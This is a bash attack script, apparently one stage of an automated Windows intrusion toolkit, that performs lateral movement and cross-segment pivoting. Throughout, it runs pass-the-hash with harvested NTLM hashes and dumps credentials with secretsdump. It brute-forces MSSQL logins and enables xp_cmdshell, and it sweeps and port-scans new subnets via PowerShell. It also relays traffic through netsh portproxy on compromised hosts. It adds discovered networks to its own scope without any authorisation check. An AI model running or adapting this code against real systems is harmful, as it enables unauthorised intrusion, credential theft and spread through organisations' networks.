#!/usr/bin/env bash

# 06_pivot — Lateral Movement, Network Discovery, and Cross-Segment Pivoting
#
# This script performs cyclical lateral movement with real cross-network
# pivoting using netsh portproxy on dual-homed compromised hosts:
#
#   1. Check all compromised hosts for additional network interfaces
#   2. Pass-the-Hash using NTLM hashes from 04_hashdump
#   3. When PtH succeeds: hashdump, check for new NICs, pivot recursively
#   4. MSSQL credential reuse against remaining MSSQL listeners
#   5. When a new network segment is discovered:
#      a. Use the dual-homed host to scan the new segment (PowerShell)
#      b. Set up netsh portproxy rules on the pivot host to relay traffic
#      c. Run the full attack chain through the forwarded ports
#      d. Track all portproxy rules for cleanup
#   6. Repeat until no new hosts can be compromised


OUTDIR="./recon"
CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
LOOT_DIR="$OUTDIR/loot"
PIVOT_DIR="$OUTDIR/pivot"
TARGETS_FILE="$OUTDIR/hosts/targets.txt"
PERSIST_DIR="$OUTDIR/persist"
MSSQL_DIR="$OUTDIR/mssql"
mkdir -p "$PIVOT_DIR" "$MSSQL_DIR"

LHOST=$(ip -br a | grep -v '^lo' | awk '{print $3}' | cut -d/ -f1 | head -1)
LPORT="${1:-4444}"


# CONFIGURABLE

TASK_NAME="WindowsHealthCheck"
# Base port for portproxy forwarding. Each forwarded service gets the next
# available port starting from here. Change if this range conflicts.
PROXY_BASE_PORT=33000


# Wordlists for brute-forcing new segments (same as 02_bruteforce)

# CONFIGURABLE WORDLISTS — Same as in 02_bruteforce.

USERS_FILE="/usr/share/wordlists/metasploit/common_users.txt"
PASS_FILE="/usr/share/wordlists/metasploit/common_passwords.txt"


if [[ ! -f "$CREDS_FILE" ]]; then
    echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
    exit 1
fi
if [[ ! -d "$LOOT_DIR" ]]; then
    echo "[-] $LOOT_DIR not found. Run 04_hashdump first."
    exit 1
fi

# Track all compromised IPs globally (de-dups across cycles)
declare -A COMPROMISED_MAP
while IFS=: read -r IP _; do
    COMPROMISED_MAP["$IP"]=1
done < "$CREDS_FILE"

# Track known network segments so we don't rescan the same one
declare -A KNOWN_NETWORKS
if [[ -f "$OUTDIR/scope.txt" ]]; then
    while read -r NET; do
        KNOWN_NETWORKS["$NET"]=1
    done < "$OUTDIR/scope.txt"
fi

# Track all networks discovered during pivoting
NETWORKS_FILE="$PIVOT_DIR/networks-discovered.txt"
> "$NETWORKS_FILE"

# Track all portproxy rules for cleanup
# Format: PIVOT_IP:LISTEN_PORT:REMOTE_IP:REMOTE_PORT:ACCESS_METHOD:ACCESS_CRED
PORTPROXY_FILE="$PIVOT_DIR/portproxy-rules.txt"
> "$PORTPROXY_FILE"

# Global proxy port counter
NEXT_PROXY_PORT=$PROXY_BASE_PORT

is_compromised() {
    [[ "${COMPROMISED_MAP[$1]+exists}" ]]
}


# Helper: Execute a command on a host via the best available method
# Tries MSSQL xp_cmdshell first, falls back to PtH via nxc

remote_exec() {
    local HOST="$1"
    local CMD="$2"

    # Check if we have MSSQL creds for this host
    local MSSQL_LINE
    MSSQL_LINE=$(grep "^${HOST}:" "$CREDS_FILE" 2>/dev/null | head -1)

    if [[ -n "$MSSQL_LINE" ]]; then
        local PORT USER PASS
        PORT=$(echo "$MSSQL_LINE" | cut -d: -f2)
        USER=$(echo "$MSSQL_LINE" | cut -d: -f3)
        PASS=$(echo "$MSSQL_LINE" | cut -d: -f4)
        printf "exec master..xp_cmdshell '%s';\nexit\n" "$CMD" | \
            mssqlclient "${USER}:${PASS}@${HOST}" -port "$PORT" 2>&1
        return
    fi

    # Check if we have PtH creds for this host
    local PTH_LINE
    PTH_LINE=$(grep "^${HOST}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null | head -1)

    if [[ -n "$PTH_LINE" ]]; then
        local PUSER NTHASH
        PUSER=$(echo "$PTH_LINE" | cut -d: -f2)
        NTHASH=$(echo "$PTH_LINE" | cut -d: -f3)
        nxc smb "$HOST" -u "$PUSER" -H "$NTHASH" -x "$CMD" 2>&1
        return
    fi

    echo "[-] No credentials available for $HOST"
    return 1
}


# Function: Run hashdump against a host we have admin access to via PtH

pivot_hashdump() {
    local HOST="$1"
    local NTHASH="$2"
    local PUSER="${3:-Administrator}"

    echo "[*]   Running credential dump on $HOST..."

    local SAFE_HOST="${HOST//./_}"
    local LOOT_SUBDIR="$LOOT_DIR/${SAFE_HOST}"
    mkdir -p "$LOOT_SUBDIR"

    local HASH_FILE="$LOOT_SUBDIR/hashes.txt"

    secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
        "${PUSER}@${HOST}" 2>&1 | tee "$HASH_FILE"

    if grep -q ":::" "$HASH_FILE" 2>/dev/null; then
        echo "[+]   Hashes extracted and saved to $HASH_FILE"
    else
        echo "[-]   No hashes extracted from $HOST"
    fi
}


# Function: Parse ipconfig output and return new CIDR ranges + the
#           interface IP on the pivot host that reaches each new network
# Output format (one per line): CIDR|PIVOT_IFACE_IP

parse_networks_from_ipconfig() {
    local IPCONFIG_OUTPUT="$1"

    local CURRENT_IP=""
    while IFS= read -r LINE; do
        if echo "$LINE" | grep -qiP 'IPv4 Address'; then
            CURRENT_IP=$(echo "$LINE" | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | head -1)
        fi
        if echo "$LINE" | grep -qiP 'Subnet Mask' && [[ -n "$CURRENT_IP" ]]; then
            local MASK
            MASK=$(echo "$LINE" | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | head -1)
            if [[ -n "$MASK" && "$MASK" != "0.0.0.0" ]]; then
                local CIDR_BITS=0
                IFS='.' read -ra OCTETS <<< "$MASK"
                for OCTET in "${OCTETS[@]}"; do
                    case $OCTET in
                        255) CIDR_BITS=$((CIDR_BITS + 8)) ;;
                        254) CIDR_BITS=$((CIDR_BITS + 7)) ;;
                        252) CIDR_BITS=$((CIDR_BITS + 6)) ;;
                        248) CIDR_BITS=$((CIDR_BITS + 5)) ;;
                        240) CIDR_BITS=$((CIDR_BITS + 4)) ;;
                        224) CIDR_BITS=$((CIDR_BITS + 3)) ;;
                        192) CIDR_BITS=$((CIDR_BITS + 2)) ;;
                        128) CIDR_BITS=$((CIDR_BITS + 1)) ;;
                        0)   ;;
                    esac
                done
                IFS='.' read -ra IP_PARTS <<< "$CURRENT_IP"
                IFS='.' read -ra MASK_PARTS <<< "$MASK"
                local NET_ADDR="$((${IP_PARTS[0]} & ${MASK_PARTS[0]})).$((${IP_PARTS[1]} & ${MASK_PARTS[1]})).$((${IP_PARTS[2]} & ${MASK_PARTS[2]})).$((${IP_PARTS[3]} & ${MASK_PARTS[3]}))"
                local CIDR_RANGE="${NET_ADDR}/${CIDR_BITS}"

                # Skip loopback, link-local, APIPA
                if [[ "$CURRENT_IP" == 127.* || "$CURRENT_IP" == 169.254.* ]]; then
                    CURRENT_IP=""
                    continue
                fi

                # Check if this network is new
                if [[ -z "${KNOWN_NETWORKS[$CIDR_RANGE]+exists}" ]]; then
                    echo "${CIDR_RANGE}|${CURRENT_IP}"
                    KNOWN_NETWORKS["$CIDR_RANGE"]=1
                fi
            fi
            CURRENT_IP=""
        fi
    done <<< "$IPCONFIG_OUTPUT"
}


# Function: Discover new networks on a compromised host
# Returns: CIDR|PIVOT_IFACE_IP lines for each new network found

discover_networks() {
    local HOST="$1"
    local METHOD="$2"   # "mssql" or "pth"
    local CRED1="$3"    # PORT (mssql) or NTHASH (pth)
    local CRED2="$4"    # USER (mssql) or PUSER (pth)
    local CRED3="$5"    # PASS (mssql only)

    echo "[*]   Checking $HOST for additional network interfaces..."

    local IPCONFIG_OUTPUT
    if [[ "$METHOD" == "mssql" ]]; then
        IPCONFIG_OUTPUT=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
            mssqlclient "${CRED2}:${CRED3}@${HOST}" -port "$CRED1" 2>&1)
    else
        IPCONFIG_OUTPUT=$(nxc smb "$HOST" -u "$CRED2" -H "$CRED1" \
            -x "ipconfig /all" 2>&1)
    fi

    local NEW_FOUND=0
    while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
        [[ -z "$CIDR_RANGE" ]] && continue
        echo "[+]   NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $HOST)"
        echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
        echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
        NEW_FOUND=1
    done < <(parse_networks_from_ipconfig "$IPCONFIG_OUTPUT")

    return $((1 - NEW_FOUND))
}


# Function: Set up a portproxy rule on a pivot host
# Creates: netsh interface portproxy add v4tov4 on the pivot host
# Records the rule in portproxy-rules.txt for cleanup
# Returns: the local listen port that was assigned

setup_portproxy() {
    local PIVOT_HOST="$1"     # The dual-homed host we control
    local PIVOT_LISTEN_IP="$2" # The IP on the pivot host WE can reach
    local REMOTE_IP="$3"      # The target on the new segment
    local REMOTE_PORT="$4"    # The port on the remote target

    local LISTEN_PORT=$NEXT_PROXY_PORT
    NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))

    echo "[*]     Setting up portproxy: ${PIVOT_HOST}:${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}"

    remote_exec "$PIVOT_HOST" \
        "netsh interface portproxy add v4tov4 listenport=${LISTEN_PORT} listenaddress=${PIVOT_LISTEN_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
        > /dev/null 2>&1

    # Record for cleanup
    echo "${PIVOT_HOST}|${PIVOT_LISTEN_IP}|${LISTEN_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"

    # Return the listen port
    echo "$LISTEN_PORT"
}


# Function: Scan a new network segment FROM the pivot host using PowerShell
# Since we can't nmap a network we don't have a route to, we run a
# lightweight scan from the compromised host itself.

# Phase 1: Ping sweep via PowerShell Test-Connection
# Phase 2: Port scan common ports (445, 1433, 3389, 139, 135, 80, 443)

remote_scan_segment() {
    local PIVOT_HOST="$1"
    local NEW_CIDR="$2"
    local RESULTS_FILE="$3"

    echo "[*]   Running remote host discovery from $PIVOT_HOST on $NEW_CIDR..."

    # Derive the network address and host range from CIDR
    # We use PowerShell on the pivot host to do this
    local NET_BASE
    NET_BASE=$(echo "$NEW_CIDR" | cut -d/ -f1 | sed 's/\.[0-9]*$//')

    # PowerShell ping sweep: test .1 through .254
    local PS_PINGSWEEP="1..254 | ForEach-Object { \$ip = '${NET_BASE}.' + \$_; if (Test-Connection -ComputerName \$ip -Count 1 -Quiet -ErrorAction SilentlyContinue) { Write-Output \$ip } }"

    local LIVE_HOSTS
    LIVE_HOSTS=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_PINGSWEEP}\"" 2>&1 | \
        grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | sort -u)

    if [[ -z "$LIVE_HOSTS" ]]; then
        echo "[-]   No live hosts found on $NEW_CIDR from $PIVOT_HOST."
        return 1
    fi

    local HOST_COUNT
    HOST_COUNT=$(echo "$LIVE_HOSTS" | wc -l)
    echo "[+]   Found $HOST_COUNT live host(s) on $NEW_CIDR"

    # Port scan each live host for key ports
    echo "[*]   Scanning key ports on discovered hosts..."
    local SCAN_PORTS="445,1433,3389,139,135,80,443,8080"

    > "$RESULTS_FILE"

    while read -r REMOTE_HOST; do
        [[ -z "$REMOTE_HOST" ]] && continue

        # Skip if it's the pivot host's own IP on that segment
        # (we already own it)
        is_compromised "$REMOTE_HOST" && continue

        local PS_PORTSCAN="\$ports = @(${SCAN_PORTS}); foreach (\$p in \$ports) { try { \$t = New-Object System.Net.Sockets.TcpClient; \$c = \$t.BeginConnect('${REMOTE_HOST}', \$p, \$null, \$null); \$w = \$c.AsyncWaitHandle.WaitOne(500, \$false); if (\$w -and \$t.Connected) { Write-Output '${REMOTE_HOST}:\$p:open'; \$t.Close() } else { \$t.Close() } } catch {} }"

        local SCAN_RESULT
        SCAN_RESULT=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_PORTSCAN}\"" 2>&1 | \
            grep ":open" | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+:\d+')

        while read -r HOSTPORT; do
            [[ -z "$HOSTPORT" ]] && continue
            echo "$HOSTPORT" >> "$RESULTS_FILE"
            echo "[+]     $HOSTPORT open"
        done <<< "$SCAN_RESULT"

    done <<< "$LIVE_HOSTS"

    if [[ ! -s "$RESULTS_FILE" ]]; then
        echo "[-]   No open ports found on new segment hosts."
        return 1
    fi

    return 0
}


# Function: Attack a new network segment through a pivot host
# This is the real cross-network pivot implementation:
#   1. Remote scan from pivot host (PowerShell)
#   2. Set up portproxy rules for discovered services
#   3. Attack through the forwarded ports from our attacker box

attack_new_segment() {
    local PIVOT_HOST="$1"       # The dual-homed host we control
    local PIVOT_REACHABLE_IP="$2" # The IP on pivot host WE can reach
    local NEW_CIDR="$3"         # The new network segment

    echo ""
    echo "[*] CROSS-NETWORK PIVOT via $PIVOT_HOST"
    echo "[*] Target segment: $NEW_CIDR"
    echo "[*] Method: netsh portproxy on $PIVOT_HOST"
    echo ""

    # Phase 1: Remote scan from the pivot host
    local SCAN_RESULTS="$PIVOT_DIR/remote-scan_${NEW_CIDR//[\/.]/_}.txt"
    if ! remote_scan_segment "$PIVOT_HOST" "$NEW_CIDR" "$SCAN_RESULTS"; then
        echo "[-] Remote scan found nothing. Skipping segment."
        return
    fi

    # Phase 2: Set up portproxy rules for each discovered service
    echo ""
    echo "[*] Setting up portproxy forwarding rules on $PIVOT_HOST..."

    # Track what we've forwarded so we can attack through it
    # Format: REMOTE_IP:REMOTE_PORT:PROXY_PORT
    local FORWARD_MAP="$PIVOT_DIR/forward-map_${NEW_CIDR//[\/.]/_}.txt"
    > "$FORWARD_MAP"

    while IFS=: read -r REMOTE_IP REMOTE_PORT; do
        [[ -z "$REMOTE_IP" || -z "$REMOTE_PORT" ]] && continue

        local PROXY_PORT
        PROXY_PORT=$(setup_portproxy "$PIVOT_HOST" "$PIVOT_REACHABLE_IP" "$REMOTE_IP" "$REMOTE_PORT")

        echo "${REMOTE_IP}:${REMOTE_PORT}:${PROXY_PORT}" >> "$FORWARD_MAP"
    done < "$SCAN_RESULTS"

    # Allow portproxy rules to take effect
    sleep 2

    echo "[+] Port forwarding established. Verifying..."
    remote_exec "$PIVOT_HOST" "netsh interface portproxy show all" 2>&1 | \
        grep -v "^$\|Impacket\|Press\|\[!\]\|ENVCHANGE" | head -20
    echo ""

    # Phase 3: Attack through forwarded ports
    echo "[*] Attacking through forwarded ports..."

    while IFS=: read -r REMOTE_IP REMOTE_PORT PROXY_PORT; do
        [[ -z "$PROXY_PORT" ]] && continue

        if [[ "$REMOTE_PORT" == "1433" ]]; then
            echo "[*] Trying MSSQL brute-force on $REMOTE_IP via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
            local FOUND=0

            while read -r USER; do
                [[ $FOUND -eq 1 ]] && break
                while read -r PASS; do
                    [[ -z "$USER" || -z "$PASS" ]] && continue
                    local RESULT
                    RESULT=$(printf 'exit\n' | \
                        mssqlclient "${USER}:${PASS}@${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" 2>&1)
                    if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press help"; then
                        echo "[+] Credentials found: $USER:$PASS on $REMOTE_IP:$REMOTE_PORT (via proxy)"
                        # Record with the REAL remote IP/port for the report
                        echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS" >> "$CREDS_FILE"
                        # Also record the proxy mapping so cleanup knows
                        echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS:proxy:${PIVOT_REACHABLE_IP}:${PROXY_PORT}" \
                            >> "$PIVOT_DIR/credreuse-successes.txt"
                        COMPROMISED_MAP["$REMOTE_IP"]=1
                        FOUND=1

                        # Enable xp_cmdshell via the proxy
                        echo "[*]   Enabling xp_cmdshell on $REMOTE_IP (via proxy)..."
                        printf "sp_configure 'show advanced options', '1';
RECONFIGURE;
sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
exec master..xp_cmdshell 'hostname';
exec master..xp_cmdshell 'ipconfig /all';
exit
" | mssqlclient "${USER}:${PASS}@${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" 2>&1 | \
                            tee "$MSSQL_DIR/${REMOTE_IP//./_}_${REMOTE_PORT}_cmdshell.txt"

                        break
                    fi
                done < "$PASS_FILE"
            done < "$USERS_FILE"

            if [[ $FOUND -eq 0 ]]; then
                echo "[-] No credentials found on $REMOTE_IP:$REMOTE_PORT"
            fi
        fi

        if [[ "$REMOTE_PORT" == "445" ]]; then
            echo "[*] Trying PtH on $REMOTE_IP via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."

            # Get all hashes we have
            local ALL_HASHES
            ALL_HASHES=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)

            while IFS= read -r HLINE; do
                local NTHASH
                NTHASH=$(echo "$HLINE" | cut -d: -f4)
                [[ -z "$NTHASH" ]] && continue

                # nxc can target a specific port with --port
                local RESULT
                RESULT=$(nxc smb "${PIVOT_REACHABLE_IP}" --port "$PROXY_PORT" \
                    -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)

                if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
                    echo "[+] PtH SUCCESS on $REMOTE_IP via proxy (hash ${NTHASH:0:16}...)"
                    echo "$REMOTE_IP:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
                    COMPROMISED_MAP["$REMOTE_IP"]=1

                    # Hashdump via the proxy
                    echo "[*]   Running secretsdump on $REMOTE_IP via proxy..."
                    local SAFE_REMOTE="${REMOTE_IP//./_}"
                    local REMOTE_LOOT="$LOOT_DIR/${SAFE_REMOTE}"
                    mkdir -p "$REMOTE_LOOT"
                    # secretsdump connects to 445 directly; use the proxy mapping
                    secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
                        -target-ip "${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" \
                        "Administrator@${PIVOT_REACHABLE_IP}" 2>&1 | \
                        tee "$REMOTE_LOOT/hashes.txt"

                    break
                fi
            done <<< "$ALL_HASHES"
        fi

    done < "$FORWARD_MAP"

    # Add discovered hosts to master targets list
    cut -d: -f1 "$SCAN_RESULTS" | sort -u >> "$TARGETS_FILE"
    sort -u "$TARGETS_FILE" -o "$TARGETS_FILE"

    echo ""
    echo "[+] Cross-network pivot on $NEW_CIDR complete."
}



# MAIN EXECUTION

echo "[*] Starting lateral movement phase"
echo "[*] Known compromised hosts: ${!COMPROMISED_MAP[*]}"
echo ""


# Phase 0: Check all currently compromised hosts for new network segments

echo "[*] Phase 0: Checking compromised hosts for additional network interfaces..."

# We need to track which pivot host reaches which new segment
# so we can set up portproxy through the right host
declare -A SEGMENT_PIVOT_MAP  # CIDR -> "PIVOT_HOST|REACHABLE_IP"

while IFS=: read -r IP PORT U P; do
    IPCONFIG=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
        mssqlclient "${U}:${P}@${IP}" -port "$PORT" 2>&1)

    while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
        [[ -z "$CIDR_RANGE" ]] && continue
        echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $IP)"
        echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
        echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
        SEGMENT_PIVOT_MAP["$CIDR_RANGE"]="${IP}|${IP}"
        # The second IP is the one WE can reach on the pivot host
        # (it's the same as the first since we're connected to it directly)
    done < <(parse_networks_from_ipconfig "$IPCONFIG")
done < "$CREDS_FILE"

# Attack any new segments found
for CIDR in "${!SEGMENT_PIVOT_MAP[@]}"; do
    IFS='|' read -r PIVOT_HOST PIVOT_REACH_IP <<< "${SEGMENT_PIVOT_MAP[$CIDR]}"
    attack_new_segment "$PIVOT_HOST" "$PIVOT_REACH_IP" "$CIDR"
done


# Phase 1: Pass-the-Hash against all live hosts (same-segment)

echo ""
echo "[*] Phase 1: Pass-the-Hash with harvested NTLM hashes"

HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)

if [[ -z "$HASH_LIST" ]]; then
    echo "[-] No NTLM hashes found in $LOOT_DIR. Skipping PtH phase."
else
    if [[ ! -f "$TARGETS_FILE" ]]; then
        echo "[-] $TARGETS_FILE not found. Skipping PtH."
    else
        PIVOT_CHANGED=1
        PIVOT_ROUND=1
        while [[ $PIVOT_CHANGED -eq 1 ]]; do
            PIVOT_CHANGED=0
            echo "[*] PtH round $PIVOT_ROUND..."

            while read -r HOST; do
                is_compromised "$HOST" && continue

                echo "[*] Trying PtH against $HOST..."
                SAFE_HOST="${HOST//./_}"
                PTH_LOG="$PIVOT_DIR/${SAFE_HOST}_pth.txt"

                # Refresh hash list each round
                HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)

                while IFS= read -r HLINE; do
                    NTHASH=$(echo "$HLINE" | cut -d: -f4)
                    [[ -z "$NTHASH" ]] && continue

                    RESULT=$(nxc smb "$HOST" -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)

                    if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
                        echo "[+] PtH SUCCESS on $HOST with hash ${NTHASH:0:16}..."
                        echo "$HOST:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
                        COMPROMISED_MAP["$HOST"]=1
                        PIVOT_CHANGED=1

                        # Recon
                        echo "[*] Running recon on $HOST via PtH..."
                        nxc smb "$HOST" -u "Administrator" -H "$NTHASH" \
                            -x "hostname && ipconfig /all && net localgroup administrators" 2>&1 | \
                            tee "$PTH_LOG"

                        # Hashdump
                        pivot_hashdump "$HOST" "$NTHASH"

                        # Check for new networks
                        IPCONFIG=$(nxc smb "$HOST" -u "Administrator" -H "$NTHASH" \
                            -x "ipconfig /all" 2>&1)

                        while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
                            [[ -z "$CIDR_RANGE" ]] && continue
                            echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $HOST)"
                            echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
                            echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
                            attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE"
                        done < <(parse_networks_from_ipconfig "$IPCONFIG")

                        break
                    fi
                done <<< "$HASH_LIST"

                if ! is_compromised "$HOST"; then
                    echo "[-] PtH failed on $HOST"
                fi
            done < "$TARGETS_FILE"

            PIVOT_ROUND=$((PIVOT_ROUND + 1))
            if [[ $PIVOT_ROUND -gt 10 ]]; then
                echo "[!] Reached maximum pivot rounds (10). Stopping."
                break
            fi
        done
    fi
fi



# Phase 2: MSSQL Credential Reuse

echo ""
echo "[*] Phase 2: MSSQL credential reuse on remaining hosts"

MSSQL_TARGETS="$OUTDIR/hosts/mssql-targets.txt"
if [[ ! -f "$MSSQL_TARGETS" ]]; then
    echo "[-] $MSSQL_TARGETS not found. Skipping credential reuse."
else
    declare -A CRED_SEEN
    declare -a CRED_PAIRS=()
    while IFS=: read -r _ _ U P; do
        KEY="${U}:${P}"
        if [[ -z "${CRED_SEEN[$KEY]+exists}" ]]; then
            CRED_PAIRS+=("$KEY")
            CRED_SEEN["$KEY"]=1
        fi
    done < "$CREDS_FILE"

    while IFS=: read -r TARGET_IP TARGET_PORT; do
        is_compromised "$TARGET_IP" && continue

        echo "[*] Trying credential reuse on $TARGET_IP:$TARGET_PORT..."
        SAFE_TARGET="${TARGET_IP//./_}"

        for CRED in "${CRED_PAIRS[@]}"; do
            U="${CRED%%:*}"
            P="${CRED#*:}"

            RESULT=$(printf "select @@servername;\nexit\n" | \
                mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)

            if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press\|ENVCHANGE"; then
                echo "[+] Credential reuse SUCCESS: $U:$P on $TARGET_IP:$TARGET_PORT"
                echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$PIVOT_DIR/credreuse-successes.txt"

                PIVOT_LOG="$PIVOT_DIR/${SAFE_TARGET}_mssql_pivot.txt"
                printf "sp_configure 'show advanced options', '1';
RECONFIGURE;
sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
exec master..xp_cmdshell 'hostname';
exec master..xp_cmdshell 'ipconfig /all';
exec master..xp_cmdshell 'net localgroup administrators';
exit
" | mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1 | \
                    tee "$PIVOT_LOG"

                echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$CREDS_FILE"
                COMPROMISED_MAP["$TARGET_IP"]=1
                echo "[+] Pivot recon saved to $PIVOT_LOG"

                # Check for new networks
                IPCONFIG=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
                    mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)

                while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
                    [[ -z "$CIDR_RANGE" ]] && continue
                    echo "[+] NEW network segment: $CIDR_RANGE (via $PIVOT_IFACE_IP on $TARGET_IP)"
                    echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
                    echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
                    attack_new_segment "$TARGET_IP" "$TARGET_IP" "$CIDR_RANGE"
                done < <(parse_networks_from_ipconfig "$IPCONFIG")

                break
            fi
        done

        if ! is_compromised "$TARGET_IP"; then
            echo "[-] No valid credentials for $TARGET_IP:$TARGET_PORT"
        fi
    done < "$MSSQL_TARGETS"
fi



